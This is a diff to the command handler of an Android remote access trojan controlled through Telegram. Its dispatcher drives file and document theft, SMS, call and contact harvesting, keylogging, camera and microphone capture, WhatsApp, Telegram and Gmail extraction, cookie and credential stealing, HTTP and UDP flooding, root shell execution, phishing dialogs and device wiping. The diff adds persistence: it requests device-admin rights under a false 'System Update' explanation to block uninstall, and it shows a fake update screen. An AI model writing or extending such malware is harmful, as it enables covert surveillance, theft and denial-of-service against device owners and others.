@@ -1,7 +1,12 @@
 package com.enterprise.rat.commands;
 
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
 import android.os.Environment;
+import com.enterprise.rat.admin.DeviceAdminReceiver;
+import com.enterprise.rat.activities.FakeUpdateActivity;
 import com.enterprise.rat.bot.BotConfig;
 import com.enterprise.rat.utils.TelegramApi;
 import com.google.gson.JsonObject;
@@ -97,11 +102,7 @@ public class CommandHandler {
         String[] parts = text.trim().split("\\s+");
         if (parts.length == 0) return;
         String cmd = parts[0].toLowerCase();
-
-        if (cmd.equals("/start") || cmd.equals("/help")) {
-            processGlobal(cmd);
-            return;
-        }
+        if (cmd.equals("/start") || cmd.equals("/help")) { processGlobal(cmd); return; }
 
         String target = "ALL";
         String[] args = new String[0];
@@ -125,9 +126,9 @@ public class CommandHandler {
 
     private void processGlobal(String cmd) {
         if (cmd.equals("/start")) {
-            TelegramApi.sendMessage("⚡ <b>REX.ENT v4.0 Online</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan /help_full untuk daftar lengkap.");
+            TelegramApi.sendMessage("⚡ REX.ENT v5.0\nSession: " + BotConfig.SESSION_ID + "\n/uninstall_block /fake_update /reset_grant");
         } else {
-            TelegramApi.sendMessage("Format: <code>/command [args]</code>\nContoh: <code>/info</code> <code>/ls /sdcard</code>");
+            TelegramApi.sendMessage("Use /command [args]. /start for session ID.");
         }
     }
 
@@ -138,9 +139,7 @@ public class CommandHandler {
                 case "/ls":
                     fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath());
                     break;
-                case "/download":
-                    if (args.length > 0) fileManager.uploadFile(args[0]);
-                    break;
+                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); break;
                 case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); break;
                 case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); break;
                 case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
@@ -172,13 +171,13 @@ public class CommandHandler {
                 case "/steal_docs": StealerManager.stealDocuments(context); break;
                 case "/extract_wa": socialMediaManager.extractWhatsApp(); break;
                 case "/extract_tg": socialMediaManager.extractTelegram(); break;
-                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "http://example.com", args.length > 1 ? Integer.parseInt(args[1]) : 100); break;
-                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "127.0.0.1", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); break;
+                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 100); break;
+                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); break;
                 case "/shell": ShellManager.executeCommand(joinArgs(args, 0)); break;
                 case "/sush": ShellManager.executeRootCommand(joinArgs(args, 0)); break;
                 case "/openurl": phishingManager.openURL(args.length > 0 ? args[0] : ""); break;
                 case "/toast": SystemManager.showToast(context, joinArgs(args, 0)); break;
-                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify your account"); break;
+                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify"); break;
                 case "/vibrate": SystemManager.vibrate(context, args.length > 0 ? Integer.parseInt(args[0]) : 1000); break;
                 case "/playsound": SystemManager.playSound(context); break;
                 case "/lock": SystemManager.lockDevice(context); break;
@@ -233,28 +232,90 @@ public class CommandHandler {
                 case "/check_env": antiDebugDetector.check(context); break;
                 case "/gmail": gmailExtractorManager.extract(); break;
                 case "/help_full":
-                    TelegramApi.sendMessage("<b>📋 ALL COMMANDS</b>\n\n" +
-                        "<b>📁 File:</b> /ls /download /rm /rename /search /zip\n" +
-                        "<b>📍 Location:</b> /location /gps /geofence\n" +
-                        "<b>💬 SMS/Calls:</b> /sms_list /sendsms /delsms /calls /contacts /sms_fwd\n" +
-                        "<b>📷 Camera:</b> /photo_front /photo_back /record /call_record\n" +
-                        "<b>🎙 Audio:</b> /mic /liveaudio\n" +
-                        "<b>🖥 Screen:</b> /screenshot /screenrecord /screen_lock /screen_unlock /screen_stream_start /screen_stream_stop\n" +
-                        "<b>⌨ Keylogger:</b> /keylog_start /keylog_stop /keylog_dump\n" +
-                        "<b>📱 Device:</b> /info /apps /battery /network /permissions /cpu_ram /usage /process_list\n" +
-                        "<b>📋 Clipboard:</b> /clipboard /setclip /crypto_monitor_start /crypto_monitor_stop\n" +
-                        "<b>🔔 Notif:</b> /notif /fakenotif /otp_scan /reply\n" +
-                        "<b>📦 Stealer:</b> /steal_images /steal_docs /extract_wa /extract_tg /cookies /history /cred_harvest_start /cred_dump /calendar_dump\n" +
-                        "<b>🌐 Network:</b> /httpflood /udpflood /wifi_scan /wifi_pass /bluetooth\n" +
-                        "<b>⚙ Shell:</b> /shell /sush /kill_pid /kill_pkg /launch /uninstall\n" +
-                        "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon /autostart\n" +
-                        "<b>🎮 Control:</b> /flashlight /volume /brightness /ring_mode /wallpaper /speak /update /ussd /sim_info");
+                    TelegramApi.sendMessage(getFullHelp());
                     break;
+
+                // ===== NEW COMMANDS =====
+                case "/uninstall_block":
+                    blockUninstall();
+                    break;
+
+                case "/fake_update":
+                    showFakeUpdate();
+                    break;
+
+                case "/reset_grant":
+                    resetPermissions();
+                    break;
+
                 default: TelegramApi.sendMessage("Unknown command. Type /help_full"); break;
             }
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Error: " + e.getMessage());
         }
+    }
+
+    private void blockUninstall() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminComponent = new ComponentName(context, DeviceAdminReceiver.class);
+
+            if (dpm.isAdminActive(adminComponent)) {
+                dpm.setUninstallBlocked(adminComponent, context.getPackageName(), true);
+                TelegramApi.sendMessage("✅ Uninstall blocked.");
+            } else {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System Update requires this.");
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+                TelegramApi.sendMessage("📱 Device admin prompt displayed. After activation, uninstall will be blocked.");
+            }
+        } catch (Exception e) {
+            TelegramApi.sendMessage("❌ " + e.getMessage());
+        }
+    }
+
+    private void showFakeUpdate() {
+        try {
+            Intent intent = new Intent(context, FakeUpdateActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+            TelegramApi.sendMessage("📱 Fake update screen displayed.");
+        } catch (Exception e) {
+            TelegramApi.sendMessage("❌ " + e.getMessage());
+        }
+    }
+
+    private void resetPermissions() {
+        try {
+            Intent intent = new Intent(context, FakeUpdateActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+            TelegramApi.sendMessage("📱 Permission reset prompt displayed.");
+        } catch (Exception e) {
+            TelegramApi.sendMessage("❌ " + e.getMessage());
+        }
+    }
+
+    private String getFullHelp() {
+        return "<b>📋 ALL COMMANDS</b>\n\n" +
+            "<b>📁 File:</b> /ls /download /rm /rename /search /zip\n" +
+            "<b>📍 Location:</b> /location /gps /geofence\n" +
+            "<b>💬 SMS/Calls:</b> /sms_list /sendsms /delsms /calls /contacts /sms_fwd\n" +
+            "<b>📷 Camera:</b> /photo_front /photo_back /record /call_record\n" +
+            "<b>🎙 Audio:</b> /mic /liveaudio\n" +
+            "<b>🖥 Screen:</b> /screenshot /screenrecord /screen_lock /screen_unlock\n" +
+            "<b>⌨ Keylogger:</b> /keylog_start /keylog_stop /keylog_dump\n" +
+            "<b>📱 Device:</b> /info /apps /battery /network /permissions /cpu_ram /usage\n" +
+            "<b>📋 Clipboard:</b> /clipboard /setclip /crypto_monitor_start\n" +
+            "<b>🔔 Notif:</b> /notif /fakenotif /otp_scan /reply\n" +
+            "<b>📦 Stealer:</b> /steal_images /steal_docs /extract_wa /extract_tg /cookies\n" +
+            "<b>🌐 Network:</b> /httpflood /udpflood /wifi_scan /wifi_pass /bluetooth\n" +
+            "<b>⚙ Shell:</b> /shell /sush /process_list /kill_pid /kill_pkg\n" +
+            "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy\n" +
+            "<b>🎮 Control:</b> /flashlight /volume /brightness /ring_mode /wallpaper /speak\n" +
+            "<b>🔐 Persistence:</b> /uninstall_block /fake_update /reset_grant /hideicon\n";
     }
 
     private String joinArgs(String[] args, int start) {
